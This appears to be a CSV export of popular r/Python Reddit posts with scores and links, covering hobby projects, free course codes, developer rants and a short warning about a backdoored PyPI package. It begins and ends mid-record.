    f'{user=} {member_since=}'

output:

    ""user='eric_idle' member_since=datetime.date(1975, 7, 31)""

____

input:

    delta = date.today() - member_since
    f'{user=!s}  {delta.days=:,d}'

output *(no quotes; commas)*:

    'user=eric_idle  delta.days=16,075'

____

input:

    from math import cos,radians
    theta=30
    print(f'{theta=}  {cos(radians(theta))=:.3f}')

output:

    theta=30  cos(radians(theta))=0.866",https://www.reddit.com/r/Python/comments/igq1pg/in_case_you_didnt_know_python_38_fstrings_support/,109,1750
g6tiih,"I made this clock using python and as GUI html, css, JS",,https://v.redd.it/r6ubz2wxfmu41,81,1752
bvekft,I made a webcam to ascii converter with opencv,,https://v.redd.it/jrmqtvcmvm131,78,1751
hi5s8f,This beziez curve i've made,,https://v.redd.it/urpl4wn79w751,53,1748
g484d4,"Today I’m releasing PyBoy v1.0.0! A Game Boy emulator written in Python, focused on scripting, AI and learning","Back in 2015, it started as a university project. But I’ve kept working on it, and others have started contributing as well over the years. Today we thought it was time to officially release PyBoy v1.0.0 on PyPi and GitHub!

[https://github.com/Baekalfen/PyBoy](https://github.com/Baekalfen/PyBoy)

&#x200B;

https://reddit.com/link/g484d4/video/hd2yupa7bst41/player

[https://i.imgur.com/jEpnRRz.gifv](https://i.imgur.com/jEpnRRz.gifv)

## What is PyBoy

In short, it’s a Game Boy emulator written from scratch in pure Python, with additional support for scripting through an API. We’ve added type definitions, which allows us to compile the software using Cython to get performance comparable to emulators written in C and C++.

## Installation

The installation instructions are simple: Install SDL2 on your system, and install PyBoy through `pip install pyboy`. If you need to compile from source, we also have detailed instructions on the GitHub Wiki for Mac, Linux and Windows.

[https://github.com/Baekalfen/PyBoy/wiki/Installation](https://github.com/Baekalfen/PyBoy/wiki/Installation)

## Features

PyBoy is designed to be accessible from Python, so we support and encourage people who want to make experiments, bots or AI’s to try it out. We are building game-specific wrappers, which at the moment allows programmers to interface with Tetris and Super Mario Land, without any intricate knowledge of the Game Boy. Documentation can be found at: [https://docs.pyboy.dk](https://docs.pyboy.dk/) .

We also want to learn and experiment with more exotic features. Based on work from a university project, we’ve added rewinding to the emulator. Which means, you’ll be able to turn back time in any game.

&#x200B;

https://reddit.com/link/g484d4/video/zofcwc78bst41/player

[https://i.imgur.com/nr9VWwe.gifv](https://i.imgur.com/nr9VWwe.gifv)

## Feedback, Contribute, Learn

We’d love to hear your feedback, and see the projects you wish to use PyBoy for! We will do our best to make it happen.

Please give any feedback in the comments below, on our Discord server or create issues/pull-requests on GitHub if you wish.",https://www.reddit.com/r/Python/comments/g484d4/today_im_releasing_pyboy_v100_a_game_boy_emulator/,49,1747
g6apwp,"Update! As promised, I made a website for the writing synthesis algorithm I wrote, It's fairly easy to use (Massively better than using the scripts itself). I hope it helps some of you to get your assignments done. Do try it out! Currently hosted on https://3c160834.ngrok.io (Link expires in 8 hrs)",,https://v.redd.it/3ynw9d402gu41,125,1742
hlqnim,Understand your data with a few lines of code in seconds using DataPrep.eda,,https://v.redd.it/qzyxly20s2951,98,1737
duyjs7,I made c++-style printing in Python :P,,https://i.redd.it/5x2x03vib4y31.png,132,1740
hjxqxr,"Using only Python, I made a web dashboard to follow the coronavirus situation in Brazil",,https://v.redd.it/o8jg0ud1cg851,90,1735
g5ymoy,"Six months into Python and Data science, my first Dashboard Web App with covid19 data using python only",,https://v.redd.it/mlqov8dbicu41,139,1723
fctk6e,I made this script to find the optimal person to be traded for camels,,https://i.redd.it/9lyg7ef56gk41.png,84,1718
g3pjcs,I wrote a script that creates a password wordlist based on the information you provide about the person.,,https://v.redd.it/byrdzjswilt41,128,1717
j6xdak,Anyone else uses the Python interpreter as a calculator?,It's just so comfy.,https://www.reddit.com/r/Python/comments/j6xdak/anyone_else_uses_the_python_interpreter_as_a/,259,1713
hhe1eb,I was able to install and use Jupyter Notebook on my Android smartphone! (Through the terminal and without using root access),,https://i.redd.it/71tq4atqgn751.png,123,1716
cxi7nd,My school's business analytics course is taught in python. This is their textbook!,,https://i.redd.it/owq8nk6fqlj31.jpg,145,1711
c8s5ym,Using Python to find a prime number that looks like the python logo (or any other image) from far away [OC],,https://i.redd.it/w4bawg6gz4831.png,89,1708
loxpv6,An Interactive Python Cheat Sheet That Brings The Answer To You,"After realizing that I spent far too much time looking things up while coding, I decided to solve the problem and created this...

The Python SpeedSheet: [https://speedsheet.io/s/python](https://speedsheet.io/s/python)

It is an interactive cheat sheet that brings the answer to you. It is a really simple idea but it worked so well that it has become an indispensable tool for me any time I'm coding. Type in what you are looking for in the search bar and the speed sheet will display the answer.

It covers core Python only and I'm sure it is missing 'must have' items but I think it is still very useful.

To those of you viewing this on smaller screens, I apologize. I haven't had time to streamline the UI.

Here is a video to show you how it works:

[https://www.youtube.com/watch?v=66RumAF50\_4](https://www.youtube.com/watch?v=66RumAF50_4)

Try it out and let me know what you think.

TLDR:

This is an interactive cheat sheet for core Python.",https://www.reddit.com/r/Python/comments/loxpv6/an_interactive_python_cheat_sheet_that_brings_the/,144,1701
hwq8zs,My 3D Shooter game using only pygame!,,https://v.redd.it/qmb1j1c9toc51,59,1703
en884v,I wrote a little python package to render images as continuous lines with varying thicknesses using matplotlib,,https://i.redd.it/yp7mktx5w5a41.png,73,1707
f17mfh,I made a random maze generator,,https://i.redd.it/1cfxaqvmyvf41.png,105,1705
gtzk7v,I created the first cross-platform Python library to create native context menus!,,https://i.redd.it/qss2hn4ix3251.gif,68,1697
i5r1es,"Post all of your beginner projects to r/MadeInPython, this sub is being overrun with them","r/madeinpython is a subreddit specifically for what you want; posting your projects. No one wants to see them here. This subreddit is genuinely one of the lowest quality programming subreddits on the site because of the amount of beginner project showcases.

r/learnpython is also much more appropriate than here. r/Python should be a place to discuss Python, post things about Python, not beginner projects.",https://www.reddit.com/r/Python/comments/i5r1es/post_all_of_your_beginner_projects_to/,183,1694
cz50wq,"I used reinforcement learning with python to solve Numberphile's ""cat and mouse"" game!",,https://i.redd.it/78xgkwmbudk31.gif,56,1690
gc691l,My experience learning Python as a c++ developer,"First off, Python is absolutely insane, not in a bad way, mind you, but it's just crazy to me. It's amazing and kind of confusing, but crazy none the less.

Recently I had to integrate Python as a scripting language into a large c++ project and though I should get to know the language first. And let me tell you, it's simply magical.

""I can add properties to classes dynamically? And delete them?"" ""Functions don't even care about the number of arguments?"" ""Need to do something? There's a library for that.""

It's absolutely crazy. And I love it. I have to be honest, the most amazing about this is how easy it is to embed.

I could give Python the project's memory allocator and the interpreter immediately uses the main memory pool of the project. I could redirect the interpreter's stdout / stderr channels to the project as well. Extending the language and exposing c++ functions are a breeze.

Python essentially supercharges c++.

Now, I'm not going to change my preference of c/c++ any time soon, but I just had to make a post about how nicely Python works as a scripting language in a c++ project. Cheers",https://www.reddit.com/r/Python/comments/gc691l/my_experience_learning_python_as_a_c_developer/,222,1683
auh5ig,I just finished a 48 hour game jam using Python and Pygame! (Source in comments.),,https://i.redd.it/g81vu7azani21.gif,125,1686
il3ydr,Map Creator made using python,,https://v.redd.it/25qdnwhxpck51,61,1676
hq8zp2,Guys do not name your variable of type dictionary as myDict/mydict during your whiteboard interviews!,"Maybe I am the only idiot who has done something like this but I just wanted to share my embarrassing interview experience. Let's cut it to the chase, so I had this video interview where I was given a question and a shared editor.  I decided to use a dictionary for my solution (one of my favorite ds) and named the variable as myDict. While I was explaining my logic, I made sure I was emphasizing the letter 't' whenever I pronounced myDict (so that it doesn't sound like my\_dick). Anyway, while I was typing the solution and explaining, obviously, my brain started concentrating on the code and I wasn't paying much attention to what I was saying. Apparently, my pronunciation started sounding like 'my dick'. On top of that, I was using that dick so much to the point that interviewer started laughing. Imagine when you are explaining the space complexity and you say something along the lines 'the size of myDict is proportional to the size of input array'. Anyone else has done something embarrassing like this?

EDIT: embracing == embarrassing ",https://www.reddit.com/r/Python/comments/hq8zp2/guys_do_not_name_your_variable_of_type_dictionary/,112,1674
gv2dy5,"I made a coding interview site with video conferencing, collaborative code editing and remote code execution.",,https://i.redd.it/wxzjlpj13g251.png,76,1672
k4rxw0,"""Automate the Boring Stuff with Python"" online course is free to sign up for the next few days with code DEC2020FREE","https://inventwithpython.com/automateudemy (This link will automatically redirect you to the latest discount code.)

You can also click this link or manually enter the code: DEC2020FREE

https://www.udemy.com/course/automate/?couponCode=DEC2020FREE

This promo code works until the 4th (I can't extend it past that). Sometimes it takes an hour or so for the code to become active just after I create it, so if it doesn't work, go ahead and try again a while later. I'll change it to DEC2020FREE2 on the 4th.

Udemy has changed their coupon policies, and I'm now only allowed to make 3 coupon codes each month with several restrictions. Hence why each code only lasts 3 days. **I won't be able to make codes after this period**, but I will be making free codes next month. [Meanwhile, the first 15 of the course's 50 videos are free on YouTube.](https://www.youtube.com/watch?v=1F_OgqRuSdI&list=PL0-84-yl1fUnRuXGFe_F7qSH1LEnn9LkW)

You can also purchase the course at a discount using my code DEC2020 or clicking https://inventwithpython.com/automateudemy to redirect to the latest discount code. I have to manually renew this each month (until I get that automation script done). And the cheapest I can offer the course is about $16 to $18. (Meanwhile, this lets Udemy undercut my discount by offering it for $12, and I don't get the credit for those referral signups. Blerg.)

**Frequently Asked Questions:** (*read this before posting questions*)

* This course is for beginners and assumes no previous programming experience, but the second half is useful for experienced programmers who want to learn about various third-party Python modules.
* If you don't have time to take the course now, that's fine. Signing up gives you lifetime access so you can work on it at your own pace.
* This Udemy course covers roughly the same content as the 1st edition book (the book has a little bit more, but all the basics are covered in the online course), which you can read for free online at https://inventwithpython.com
* The 2nd edition of Automate the Boring Stuff with Python is free online: https://automatetheboringstuff.com/2e/
* I do plan on updating the Udemy course for the second edition, but it'll take a while because I have other book projects I'm working on. Expect that update to happen in mid-2021. If you sign up for this Udemy course, you'll get the updated content automatically once I finish it. It won't be a separate course.
* It's totally fine to start on the first edition and then read the second edition later. I'll be writing a blog post to guide first edition readers to the parts of the second edition they should read.
* I wrote a blog post to cover [what's new in the second edition](https://inventwithpython.com/blog/2019/10/07/whats-new-in-the-2nd-edition-of-automate-the-boring-stuff-with-python/)
* **You're not too old to learn to code. You don't need to be ""good at math"" to be good at coding.**
* Signing up is the first step. Actually finishing the course is the next. :) [There are several ways to get/stay motivated.](https://www.reddit.com/r/learnprogramming/wiki/faq#wiki_how_can_i_get.2Fstay_motivated_to_learn_programming.3F) I suggest getting a ""gym buddy"" to learn with.",https://www.reddit.com/r/Python/comments/k4rxw0/automate_the_boring_stuff_with_python_online/,83,1657
8hvzja,Backdoor in ssh-decorator package,"Do not install or use the [ssh\-decorator](https://pypi.org/project/ssh-decorate/#files) package from Pip. It has a backdoor inserted to steal all your SSH credentials. I've already contacted the developer to take it out. He hasn't responded so for now, use at your own risk! [https://ibb.co/kdDk67](https://www.linkedin.com/redir/redirect?url=https%3A%2F%2Fibb%2Eco%2FkdDk67&urlhash=SFzn&_t=tracking_anet)

**UPDATE:** The compromised package has been taken down now.

https://preview.redd.it/zu0guck3cmw01.png?width=819&format=png&auto=webp&s=91772cecb537bbac3c364af80c0a824a42714421",https://www.reddit.com/r/Python/comments/8hvzja/backdoor_in_sshdecorator_package/,180,1657
eazg05,Made my first fractal,,https://i.redd.it/okmgs2g83t441.gif,51,1658
e4js7g,an error in my code makes the Mandelbrot set look even cooler,,https://i.redd.it/y9qbirw5w1241.png,82,1636
jm9dnh,"[RANT] Clients telling me ""I know python"" is a major red flag to me","I do freelance python development in mainly web scraping, automation, building very simple Flask APIs, simple Vue frontend and more or less doing what I like to call ""general-purpose programming"".

Now, I am reasonably skilled in python, I believe. Don't write OOP and class-based python unless I am doing more than 100 lines of code. Most often write pretty simple stuff but most of the time goes into problem-solving.

But I despise freelancing. 1 out of every 3 comments/posts I make on Reddit is how much I hate doing freelancing. I come to Reddit to vent so I am sorry to the fellas who is reading this because they are more or less my punching bag :( I am sorry sir/madam. I am just having a bad life, it will end soon.

So, today I am going to rant about one of the more """"fun"""" things of freelancing, client telling me they know python.

Whenever a client tells me that they know python, I try to ignore them but often times I have to entertain the idea anyway because jobs are scarce. I keep telling myself ""maybe this will work out great"" but it doesn't.

It never goes right. Here is the thing. If you do what I do you will realize the code is often quite simple. Most of the effort goes into problem-solving. So when the client sees the code and me getting paid by the hour, ""They are like I thought you are *best darn python developer* I could have written that myself!""

My immediate impulse is to go on a rant and call that person something rotten. But I have to maintain ""professionalism"".

Then there is the issue of budgeting. I do fixed payment contracts for smaller engagements. But oftentimes these python experts will quote me something that is at least one-fourth of a reasonable budget. And by reasonable I mean non-US reasonable budget which is already one-fifth of a reasonable US programming project budget. But anyway they quote that because they know how is easy it is to do my job.

There is more because this is rant by the way. So, clients with python knowledge will say to me ""I have this python file..."" which is the worst thing to say at this point. They think they have done the ""majority"" of the work. But here is the way I see it-

a. Either they have just barely scratched the surface
b. They have a jumbled up mess
c. They had another dev look into the project who already failed
d. They had to do a ""code review"" of their previous freelancer and they ended up stealing the code

There is no positive way to imagine this problem. I have seen too much crappy code and too much of arguments like ""they had done the work for me, so I should charge near to nothing"".

People don't know exactly why senior devs get paid so much money. Junior devs write code, senior devs review code. That is why they get paid more. Making sense of other people's code is a risky and frustrating thing and it could be incredibly time-consuming. And moreover in most cases building upon a codebase is more difficult than writing it from the scratch.

Doctors rant about ""expert"" patients earning their MDs from WebMD and I am seeing the exact same thing happen to me with clients knowing how to write loops in python.

Python is easy to learn, programming these days is easy to learn. But people are not paying programmers for writing loops and if statements. They are paying them to solve problems. Knowing the alphabet doesn't make you a poet. And yes in my eyes programming is poetry.",https://www.reddit.com/r/Python/comments/jm9dnh/rant_clients_telling_me_i_know_python_is_a_major/,337,1635
gcra5c,I made a raytracer in Python from scratch!,,https://i.redd.it/c40fzt4t5kw41.png,137,1640
hyxwlh,I made a Backtracking Algorithm Visualizer in Python with Pygame as my very first personal project!,,https://i.redd.it/5qqjkln01gd51.gif,44,1624
eip48b,"""The rules of perf"" at Dropbox",,https://i.redd.it/g7g5hf7dxm741.jpg,163,1625
jo4h73,Python is Now Officially the Second Most Popular Programming Language,,https://techdator.net/python-is-now-officially-the-second-most-popular-programming-language/,120,1605
lsgyvf,"We're building an app that lets you search Stack Overflow, Python documentation, and code on GitHub","Hey folks! My friend and I are building [Devbook](https://usedevbook.com). It’s a desktop app that allows you to search in Stack Overflow, search and read documentation, and search public code on GitHub from a single place. The whole app can be controlled just using a keyboard. No need to use your mouse. This way, it’s easier to stay in the flow.

The app works similarly to Spotlight on macOS. You hit a global shortcut and Devbook appears as an overlay over the currently active app. This way you minimalize the needed context switching when looking up information. You almost don't leave your coding editor.

You can think about Devbook as a search engine made just for developers. But no ads, content marketing, SEO, etc.

I thought the community here might find it useful. Currently, we support Python, Flask, Django docs, and adding more with time.

Give it a try and let me know what you think!

**EDIT**

Some folks have been asking us for the pricing. Devbook is free. The plan is to build team features later on and have subscriptions for teams and organizations. If it will be possible, we want to always have a free plan for solo developers.

However, if you really want to support us, I just set up the [Buy Me A Coffee page](https://www.buymeacoffee.com/P8dyVmoAF) for Devbook. You can donate a small amount if you feel comfortable. It will probably make us jump around from the excitement since it would be our first revenue:)

**EDIT 2**

Oh, boy did this blow-up! Every week, we just share Devbook in various subreddits we think might enjoy it. We didn't expect to blow it up that much at all. Thank you all folks for trying Devbook out. It means a lot.

&#x200B;

For the near future Devbook release, we're building an extensions system that will allow you to add search functionality we don't support out of the box. Imagine Google customizable through vscode-like extensions. You can read more [here](https://github.com/DevbookHQ/devbook-extension).

Keep the feedback going. Big updates coming soon!",https://www.reddit.com/r/Python/comments/lsgyvf/were_building_an_app_that_lets_you_search_stack/,233,1598
icefif,"I wrote a syllabus for learning Python and Django. Four people have gone through it, two are interviewing and one got a job. It's based on using a somewhat even mix of coding challenges, personal projects and books.",,/r/learnprogramming/comments/i9vuhr/i_wrote_a_syllabus_for_learning_python_and_django/,73,1600
gxl1e4,Just a python apprentice here... Was bored every day of attending school meetings on zoom so I used pyautogui to attend those for me;),,https://i.redd.it/9lowwhuv58351.jpg,162,1589
iix2ru,"I’m learning Python, but I also came across my dads old BASIC textbook. The problem solving aspect of the book is almost better than any modern one I’ve read.",,https://i.redd.it/ukcego3kezj51.jpg,89,1589
jvbqzc,The youtube-dl repository has been restored on GitHub with help from the Electronic Frontier Foundation,,https://github.com/github/dmca/blob/b7a2f3602c43eb4761a75bc8a69242b5ce975563/2020/11/2020-11-16-RIAA-reversal.md,62,1587
crdx3p,Spent a few days hacking together a ray-casting engine that renders to ascii for playing in your terminal! With shading and textures! Link in the comments.,,https://i.redd.it/6crqmqep4wg31.gif,116,1586
hw78c7,i created a sorting algorithm visual that can compare the speed and efficiency of different algorithms on variable-length lists in python,,https://v.redd.it/b9fi1f1nlic51,41,1588
je7wqo,I've accidentally made a weird art generator. Help me.. I cant stop running it.,"I was trying to make something similar to the default profile picture you are assigned on stack overflow. But what came out the other end was not what I was expecting!! hahah

I mean look at these things, and because its random they are always different.

There are loads of settings to change and mess about with, maybe some of you might enjoy it too?

Its made with shapely, numpy and skimage.

Don't hate me - but because SO many people told me to make money out of it I've removed the source code. 

&#x200B;

You can download the pickled function here. (will add link soon - just working on it)

&#x200B;

To run - you need to import 

\`\`\`from shapely.affinity import rotate as rt

from shapely.geometry import Polygon

import random

import numpy as np

from skimage.transform import rotate

from PIL import Image, ImageDraw\`\`\`

&#x200B;

function inputs are 

""""""

colours (list) : list of hex colours or rgb tuples used to form the basis of the shape colours

back\_colour (str or tuple) : hex string or rgb tuple for the background colour

line colour (str or tuple) : hex string or rgb tuple for the shapes outside edge colour

wanted\_size (tuple) : size in pixel (x,y)  MAX 300 for testing 

x\_times (int): times to duplicate the image on the x axis

y\_times (int): times to duplicate the image on the y axis

shape\_draws (int): how many times to draw shapes on the inital image

line\_width (int) : width of outside stoke on each shape

""""""    

&#x200B;

&#x200B;

&#x200B;

Google drive link with tonnes more here - [https://drive.google.com/drive/folders/1OC-XYGh00tQR8zYorLmdrEzlQaKrhDSE?usp=sharing](https://drive.google.com/drive/folders/1OC-XYGh00tQR8zYorLmdrEzlQaKrhDSE?usp=sharing)

https://preview.redd.it/wljp0jwzr3u51.png?width=600&format=png&auto=webp&s=fc8da1b99561618e472791fb2aa7eefb0e608939

https://preview.redd.it/pp7dvuk5l3u51.png?width=1000&format=png&auto=webp&s=b57b84abad942399b0fb58734320f14801709510

https://preview.redd.it/2x24re34j3u51.png?width=352&format=png&auto=webp&s=364819d42eec39c1254d66b545743c1d724dfa9d

&#x200B;

https://preview.redd.it/kdwbfqm9k3u51.png?width=600&format=png&auto=webp&s=81e34d6326fa37e948d8004500db4965cfb732eb

https://preview.redd.it/46l8bnm9k3u51.png?width=600&format=png&auto=webp&s=364edbc4f1d3bba51a3342ef0b4f5d15fb11265e

https://preview.redd.it/3ibi1sm9k3u51.png?width=600&format=png&auto=webp&s=addb0c28de2f019056a72339e06bf045c5845739

&#x200B;

https://preview.redd.it/nv35sb05r7u51.png?width=600&format=png&auto=webp&s=5d6012e2a958933a3af2271ebe4b4ef0772197fe

https://preview.redd.it/814coi05r7u51.png?width=600&format=png&auto=webp&s=1c55c9f8c0d01263b0d6b4daa68d67331d9c0fc1

https://preview.redd.it/zia6yc05r7u51.png?width=592&format=png&auto=webp&s=ceb393da42623eea986d45e6f4b49895d1c46d70

https://preview.redd.it/say57q05r7u51.png?width=600&format=png&auto=webp&s=8218b2d8f0a256a1f5f23ede6ad1f539bf55a00d

&#x200B;

https://preview.redd.it/a5a37fxts7u51.png?width=600&format=png&auto=webp&s=c2a1e2536cbd91726d9c360ea82d0c77ae3afd0d

https://preview.redd.it/6v7capxts7u51.png?width=592&format=png&auto=webp&s=376994dac92ee5bbc7f2a971b4303865873d7e14

https://preview.redd.it/nwtraoxts7u51.png?width=600&format=png&auto=webp&s=167ec598ad4ae7ae5361aaa5db9a32bcedfeafbe

https://preview.redd.it/4esgkvxts7u51.png?width=592&format=png&auto=webp&s=28272074c658966d0bcd312cc4e4e935ba3ff8b8",https://www.reddit.com/r/Python/comments/je7wqo/ive_accidentally_made_a_weird_art_generator_help/,185,1582
dk7qm7,"Here is my progress so far on my python game engine for the terminal, after almost a month of work. It can convert pictures and make animations, move sprites, move and animate ascii art, display sprites with layer effect, transparency and so on... I plan on releasing it's source code in a month.",,https://v.redd.it/65w9y47qjjt31,155,1581
f6hynk,Backtracking algorithm visualized with Sudoku,,https://v.redd.it/61xndy0payh41,69,1579
ftktcn,I made a program that allows you to download song cover arts from Spotify or Soundcloud and then embeds them to your MP3 files.,,https://i.redd.it/iu1yzg7d5eq41.gif,70,1579
fzwbcx,I made a face recognition program,,https://v.redd.it/63y8wr3axds41,159,1580
fpgq1j,Real Python is giving away a free Python course bundle [access code inside],"😷Stuck at home? We're giving away a free Python course bundle right now:

[https://realpython.com/free-courses-march-2020](https://realpython.com/free-courses-march-2020)

(Access code at the link above, no strings attached whatsoever, feel free to share)",https://www.reddit.com/r/Python/comments/fpgq1j/real_python_is_giving_away_a_free_python_course/,79,1577
humqci,"I've seen a bunch of Pygame physics simulations here recently, so here's my take on it: accurately modelling the orbits of objects in our solar system using data from JPL Horizons",,https://v.redd.it/rhk6wrjjx0c51,79,1577
92tbgy,Found it funny ;),,https://i.redd.it/uafkeky6huc11.jpg,151,1580
jn2xh2,Dear PyGui Now Has Built-in Demo,,https://i.redd.it/m3qzqnys1yw51.png,84,1569
hfgvsq,I made a hanged man game using turtle library,,https://v.redd.it/wd8q9icdzz651,54,1577
pbbjeo,prettymaps: A small set of Python functions to draw pretty maps from OpenStreetMap data,,https://github.com/marceloprates/prettymaps,69,1571
8cwq72,I made a command-line tool that instantly fetches Stack Overflow results when you get a compiler error,,https://github.com/shobrook/rebound,75,1564
aa64p6,My nightly ritual.,,https://imgur.com/cQNoNCq,213,1559
eme6k8,[OC] Maze solving algorithm recursively attemps to solve the maze,,https://v.redd.it/y6sn2jskus941,123,1555
oulpdu,Texas Instruments’ new calculator incorporates popular Python programming language,,https://www.dallasnews.com/business/local-companies/2021/07/29/texas-instruments-new-calculator-incorporates-popular-python-programming-language/,106,1549
n0aitm,The most copied comment in Stack Overflow is on how to resize figures in matplotlib,,https://stackoverflow.blog/2021/04/19/how-often-do-people-actually-copy-and-paste-from-stack-overflow-now-we-know/,177,1547
jj6d01,"I wrote a beginner's book about Python. Pay what you like, or nothing.","I've written programming textbooks for beginners before, about OCaml and Haskell, but this is the first time I've written about an imperative language, and I would love for you to have a look at it.
It's available on Amazon as a printed book ($19.99) and Kindle book ($9.99):

https://www.amazon.com/Python-Very-Beginning-exercises-answers/dp/0957671156/

It's also available as a DRM-free PDF, for $9.99:

https://www.pythonfromtheverybeginning.com

If you can't afford $9.99, please contact me using the contact form on the website telling me how much you can afford, or letting me know you can't afford it at all. I will send it to you by email. This process will be manual, not immediate! But I will try to be as quick as I can.",https://www.reddit.com/r/Python/comments/jj6d01/i_wrote_a_beginners_book_about_python_pay_what/,37,1543
i1w03b,"""Automate the Boring Stuff with Python"" online course is free to sign up for the next few days with code","https://inventwithpython.com/automateudemy (This link will automatically redirect you to the latest discount code.)

You can also click this link or manually enter the code: COPSHOTMEINPORTLAND2

https://www.udemy.com/course/automate/?couponCode=COPSHOTMEINPORTLAND2

This promo code works until August 4th (I can't extend it past that). Sometimes it takes an hour or so for the code to become active just after I create it, so if it doesn't work, go ahead and try again a while later. I'll change it to COPSHOTMEINPORTLAND2 on the 4th.

Udemy has changed their coupon policies, and I'm now only allowed to make 3 coupon codes each month with several restrictions. Hence why each code only lasts 3 days. **I won't be able to make codes after this period**, but I will be making free codes next month. [Meanwhile, the first 15 of the course's 50 videos are free on YouTube.](https://www.youtube.com/watch?v=1F_OgqRuSdI&list=PL0-84-yl1fUnRuXGFe_F7qSH1LEnn9LkW)

You can also purchase the course at a discount using my code COPSHOTMEINPORTLAND2 or clicking https://inventwithpython.com/automateudemy to redirect to the latest discount code. I have to manually renew this each month (until I get that automation script done). And the cheapest I can offer the course is about $16 to $18. (Meanwhile, this lets Udemy undercut my discount by offering it for $12, and I don't get the credit for those referral signups. Blerg.)

**Frequently Asked Questions:** (*read this before posting questions*)

* This course is for beginners and assumes no previous programming experience, but the second half is useful for experienced programmers who want to learn about various third-party Python modules.
* If you don't have time to take the course now, that's fine. Signing up gives you lifetime access so you can work on it at your own pace.
* This Udemy course covers roughly the same content as the 1st edition book (the book has a little bit more, but all the basics are covered in the online course), which you can read for free online at https://inventwithpython.com
* The 2nd edition of Automate the Boring Stuff with Python is now available online: https://automatetheboringstuff.com/2e/
* I do plan on updating the Udemy course for the second edition, but it'll take a while because I have other book projects I'm working on. Expect that update to happen in mid- or late-2020. If you sign up for this Udemy course, you'll get the updated content automatically once I finish it. It won't be a separate course.
* It's totally fine to start on the first edition and then read the second edition later. I'll be writing a blog post to guide first edition readers to the parts of the second edition they should read.
* I wrote a blog post to cover [what's new in the second edition](https://inventwithpython.com/blog/2019/10/07/whats-new-in-the-2nd-edition-of-automate-the-boring-stuff-with-python/)
* **You're not too old to learn to code. You don't need to be ""good at math"" to be good at coding.**
* Signing up is the first step. Actually finishing the course is the next. :) [There are several ways to get/stay motivated.](https://www.reddit.com/r/learnprogramming/wiki/faq#wiki_how_can_i_get.2Fstay_motivated_to_learn_programming.3F) I suggest getting a ""gym buddy"" to learn with.",https://www.reddit.com/r/Python/comments/i1w03b/automate_the_boring_stuff_with_python_online/,84,1543
e0xm0t,I cross-stitched the Python logo!,,https://i.redd.it/9aa9g032im041.jpg,36,1551
my1m66,"Stop hardcoding and start using config files instead, it takes very little effort with configparser","We all have a tendency to make assumptions and hardcode these assumptions in the code (""it's ok.. I'll get to it later"").  What happens later?  You move on to the next thing and the hardcode stays there forever.  ""It's ok, I'll document it.. "" - yeah, right!

There's a great package called ConfigParser which you can use which simplifies creating config files (like the windows .ini files) so that it takes as much effort as hardcoding!  You can get into the hang of using that instead and it should both help your code more scalable, AND help with making your code a bit more maintainble as well (it'll force you to have better config paramters names)

&#x200B;

Here's a post I wrote about how to use configparser:

[https://pythonhowtoprogram.com/how-to-use-configparser-for-configuration-files-in-python-3/](https://pythonhowtoprogram.com/how-to-use-configparser-for-configuration-files-in-python-3/) 

&#x200B;

If you have other hacks about managing code maintenance, documentation.. please let me know!  I'm always trying to learn better ways",https://www.reddit.com/r/Python/comments/my1m66/stop_hardcoding_and_start_using_config_files/,324,1541
eolak4,Visualisation of different path finding algorithms,,https://v.redd.it/v03xnbxwxqa41,73,1536
845epf,Python surpasses C# in popularity among developers,,https://insights.stackoverflow.com/survey/2018/#technology-programming-scripting-and-markup-languages,171,1539
86ufrf,A path finder i recently made in Python PyGame,,https://i.redd.it/ax3q93ikvqn01.gif,111,1530
118ynyy,"Spent Months Writing A Web Dev Course For A Platform, But It Got Canceled Midway. Publishing It Free For The Community.",,https://leanpub.com/c/flask-masterclass,91,1530
mcs1kj,"Google Translate, but for Sign Language - I used Python and OpenCV AI Kit to perform Sign Language Detection.",,https://youtu.be/2fXJe9YqXgU,52,1525
8h512c,Just finished my graduation cap for tomorrow,,https://i.redd.it/ukzmzc7bmyv01.jpg,115,1531
lfuy5e,I wrote a song about everyone's favorite Python Enhancement Proposal,,https://www.youtube.com/watch?v=hgI0p1zf31k,109,1529
9t3ko5,My Halloween Facepaint - Scary huh?,,https://i.redd.it/ezjourczilv11.png,82,1520
cg1ipy,"Physics simulator with rotation and collision I made with Python. If you dropped your phone, and it just kept bouncing!",,https://v.redd.it/8qy69vazxob31,65,1524
bx9rrz,Win10 is going to start including Python 3.7,,https://blog.adafruit.com/2019/06/04/new-guide-python-is-in-the-latest-build-of-windows-10-adafruitlearningsystem-python-adafruit-win10-windows-adafruit/,176,1521
ha5901,Developed a 'personal home assistant' whatsapp bot to control an appliance (lamp in this case),,https://v.redd.it/x9damwy5aa551,76,1512
fio4x4,I am just a beginner in programming. Today I have created my first ever project (Simple Calculator) with Python GUI Tkinter. Thank you for this great community for inspiring me so much.,,https://i.redd.it/0aqf9qi2xom41.png,92,1513
gyf7on,Training a neural net on 7 years of text messages became surprisingly self aware,,https://i.redd.it/qit4n4nlji351.png,83,1506
jjpd77,"Out of curiosity, how many of you guys started your journey with 'Automate the boring stuff'?",,https://www.reddit.com/r/Python/comments/jjpd77/out_of_curiosity_how_many_of_you_guys_started/,331,1507
odhbql,"New search engine made with Python that's anonymous and has no ads or tracking. It tries to fight spam, and gives you control of how you view search results. You can search and read content anonymously with a proxied reader view. The alpha is live and free for anyone to use at lazyweb.ai","&#x200B;

[LazyWeb: Anonymous and ad-free search made in Python](https://reddit.com/link/odhbql/video/hii57yv446971/player)

[https://lazyweb.ai](https://lazyweb.ai)

We're a little two-person team (Angie and Jem). We're bootstrapping and self-funded. I'm the programmer.

I wanted to share it because it was a fun and interesting project to build, and Python made it possible for us to get a long way as a small team. It uses serverless on the backend (AWS). We're using Spacy and GPT-2, and some PyTorch models. It uses BeautifulSoup for spidering/crawling/content retrieval. The front-end is React.

It has a different type of user interface to any other search engine, as it is chat based. And it lets you choose how you view results, either visually like an Instagram feed or cards, or minimal like Hacker News or the old Google. It tries to fight SEO spam and strips out ads and ad-tech from search results.

We have a project on GitHub with Jupyter notebooks and sample data with experiments and scripts, including examples of querying other search APIs, and to generate example utterances programatically to use for NLP models with sources like Wikipedia, StackOverflow and Wolfram|Alpha:

[https://github.com/lazyweb-ai/lazyweb-experiments](https://github.com/lazyweb-ai/lazyweb-experiments)

We're only a small team but hope to share more of our work as open source as we progress.",https://www.reddit.com/r/Python/comments/odhbql/new_search_engine_made_with_python_thats/,213,1499
k2kbs4,"""Sillynium"" - Auto generate working Python Selenium scripts by drawing coloured rectangles around web elements on a page that you want to automate","TLDR: 60 sec video here:[https://streamable.com/1y17lt](https://streamable.com/1y17lt)

